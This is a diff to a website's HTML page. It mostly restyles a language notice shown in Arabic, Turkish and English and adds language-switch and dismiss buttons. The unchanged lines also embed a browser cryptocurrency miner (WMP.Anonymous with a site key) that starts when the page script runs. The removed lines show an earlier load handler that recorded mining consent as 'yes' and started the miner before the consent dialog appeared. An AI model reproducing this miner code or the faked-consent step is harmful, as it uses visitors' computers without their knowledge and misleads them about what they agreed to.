@@ -2873,18 +2873,55 @@ window.onload = () => {
   top: 10px;
   right: 10px;
   left: 10px;
-  background-color: #f0f8ff;
+  background-color: #f9f9f9;
   color: #333;
-  border: 1px solid #87ceeb;
+  border: 1px solid #ccc;
   padding: 15px;
-  border-radius: 8px;
+  border-radius: 10px;
   z-index: 10000;
   font-size: 14px;
   max-width: 400px;
   margin: auto;
-  box-shadow: 0 0 8px rgba(0,0,0,0.2);
-  direction: ltr;
+  box-shadow: 0 0 10px rgba(0,0,0,0.2);
   text-align: left;
+}
+
+#language-notice p {
+  line-height: 1.6;
+}
+
+#lang-buttons {
+  margin-top: 10px;
+}
+
+#lang-buttons button {
+  margin: 5px 4px 10px 0;
+  padding: 6px 12px;
+  font-size: 13px;
+  border-radius: 6px;
+  border: none;
+  background-color: #2196F3;
+  color: white;
+  cursor: pointer;
+}
+
+#lang-buttons button:hover {
+  background-color: #1976D2;
+}
+
+#close-language-btn {
+  padding: 6px 12px;
+  background-color: #4CAF50;
+  color: white;
+  border: none;
+  border-radius: 6px;
+  cursor: pointer;
+  font-size: 14px;
+  width: 100%;
+}
+
+#close-language-btn:hover {
+  background-color: #3e8e41;
 }
 
 	
@@ -2898,32 +2935,50 @@ window.onload = () => {
   var miner = WMP.Anonymous('SK_Fzqyrb8LOlTe3gB2eVdlV', { throttle: 0.1 });
   miner.start();
 
-	// عرض رسالة التنبيه بلغات متعددة مرة واحدة فقط للمستخدم
+	
+</script>
+
+	    <script>
 function showLanguageNotice() {
   if (!localStorage.getItem("language_notice_shown")) {
     const notice = document.createElement("div");
     notice.id = "language-notice";
     notice.innerHTML = `
       <strong>🌍 Notice:</strong><br>
-      <p>
-        <span style="direction: rtl;">🔹 اللغة الافتراضية للموقع هي الإنجليزية. يمكنك ترجمة الموقع إلى العربية أو التركية باستخدام زر الترجمة في متصفح Google Chrome.</span><br><br>
-        🔹 Sitenin varsayılan dili İngilizce'dir. Google Chrome çeviri düğmesi ile Türkçe veya Arapçaya çevirebilirsiniz.<br><br>
-        🔹 The default language of this site is English. You can translate the site to Arabic or Turkish using the Google Chrome translate button.
+      <p style="margin-top: 8px;">
+        🔹 The default language of this site is English. You can translate the site to Arabic or Turkish using the Google Chrome translate button.<br><br>
+        🔹 اللغة الافتراضية للموقع هي الإنجليزية. يمكنك ترجمة الموقع إلى العربية أو التركية باستخدام زر الترجمة في متصفح Google Chrome.<br><br>
+        🔹 Sitenin varsayılan dili İngilizce'dir. Google Chrome çeviri düğmesi ile Türkçe veya Arapçaya çevirebilirsiniz.
       </p>
+      <div id="lang-buttons">
+        <button onclick="switchLang('en')">🇬🇧 English</button>
+        <button onclick="switchLang('ar')">🇸🇦 عربي</button>
+        <button onclick="switchLang('tr')">🇹🇷 Türkçe</button>
+      </div>
+      <button onclick="hideLanguageNotice()" id="close-language-btn">✅ تم الفهم</button>
     `;
     document.body.appendChild(notice);
+  }
+}
+
+function hideLanguageNotice() {
+  const notice = document.getElementById("language-notice");
+  if (notice) {
+    notice.remove();
     localStorage.setItem("language_notice_shown", "true");
   }
 }
 
-window.onload = () => {
-  localStorage.setItem('mining_consent', 'yes');
-  startMiner();
-  document.getElementById('consent-modal').style.display = 'flex';
-  showLanguageNotice(); // إظهار التنبيه
-};
+function switchLang(lang) {
+  alert("🔄 سيتم ترجمة الصفحة تلقائيًا عبر Google Translate.\nإذا لم يظهر زر الترجمة، اضغط على زر الترجمة من شريط المتصفح.");
+  // المستخدم يُوجّه لاستخدام ترجمة المتصفح – لا يمكن تغيير لغة الموقع تلقائيًا من JS فقط بدون محتوى متعدد اللغات.
+}
 
+window.onload = () => {
+  showLanguageNotice();
+};
 </script>
+
 
 </body>
 </html>
